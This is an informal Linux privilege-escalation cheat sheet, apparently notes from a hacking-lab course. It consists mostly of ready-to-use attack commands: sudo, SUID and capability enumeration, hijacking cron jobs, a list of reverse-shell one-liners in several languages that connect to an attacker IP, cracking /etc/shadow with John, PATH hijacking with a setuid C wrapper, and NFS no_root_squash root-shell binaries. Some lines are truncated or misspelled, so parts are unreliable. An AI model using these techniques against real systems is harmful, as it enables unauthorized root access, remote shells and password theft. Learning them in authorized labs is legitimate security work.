If you have local access to the machine first you want to find a way to get root.
First check what programs you can run as sudo so run:

	sudo -l

This is list all the programs that you can run as root and might give you a path to escalate your
privileges. Check at this wedsite to see if any of the progams are listed for sudo:

	https://gtfobins.github.io/gtfobins/nmap/

Next we will check to see if any programs allow SUID or SGID bits set.

	find / -type f -perm -04000 -ls 2>/dev/null

These will likely let you read the contents of a file that you normally would not normally be able to.
For example the contents of /etc/shadow, this may allow you to crack a password and get root access.


The next thing we will check is capabilities using this command:

	getcap -r / 2>/dev/null


This will redirect any errors using the standard 2>/dev/null, if any capabilities are found check gtfo 
for a path.


Next we will look for any crontab jobs that we might be able to hijack:

	cat /etc/contab

If there is an existing crobtab job we can change the code to start a reverse shell.
Make sure the file is still executable after using:

	chmod +x <filename>

	Bash:
	bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
	
	PERL:
	perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in

	
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))

	PHP:
	php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
	
	Ruby:
	ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

	Netcat:
	nc -e /bin/sh 10.0.0.1 1234

	Java:
	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()

Make sure you change the IP address and Port and start a listening port on your attck machine.
For even more reverse shells check out this site:

	https://www.revshells.com/

Once you have a root shell you can read the contents of /etc/shadow, this will allow you to try
and crack the hashes.

Copy the full shadow file or just the users you wish to crack then run this John command:

	john --wordlist=/usr/share/wordlist/rockyou.txt --format=sha512crypt shadowfile.txt

Check your path variables with:


	echo $PATH
	find / -writable 2>/dev/null
	find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u


The second and third commands will show what folders your user has write access to.
If have have writeable access to the path you can add additionl paths:

	export PATH=/tmp:$PATH

For example this will add the /tmp folder to path.  Then cd into tmp and crate a file thm.


	cd /tmp
	echo "/bin/bash" > thm
	chmod 777 thm
	

Then create a c file that calls the thm binary which will elevate your privledges to root.

	#include<unistd.h>
	void main()
	{ setuid(0);
	  setgid(0);
	  system("thm");
	}

Once the file is saved for example as file_exp.c complile it then run it.


	gcc file_exp.c -o file -w
	chmod u+s file
	./file


Next we will check for shares that we can mount.  One the target system run:

	cat /etc/exports

If any shares have no_root_squash then if they are mounted on another system you will not lose root.

On the attack system run:

	showmount -e <target IP>

Create a tmp directory and then mount a share that has no_root_squash and your user account has executable rights.

	mkdir /tmp/backup
	mount -o rw <target IP>:/<share> /tmp/backup
	cd /tmp/backup
	nano nfc.c

	int main()
	{ setgid(0);
	  setuid(0);
	  system("/bin/bash");
	  return 0;
	}

Once you save the nfs.c complile it with gcc.


	gcc nfs-c -o nfs -w
	chmod +s nfs


Switch back to the attack machine and you should see both files run the compliled file.


	./nfs

There are more and new escalation techniques all the time but this will get you started.



	

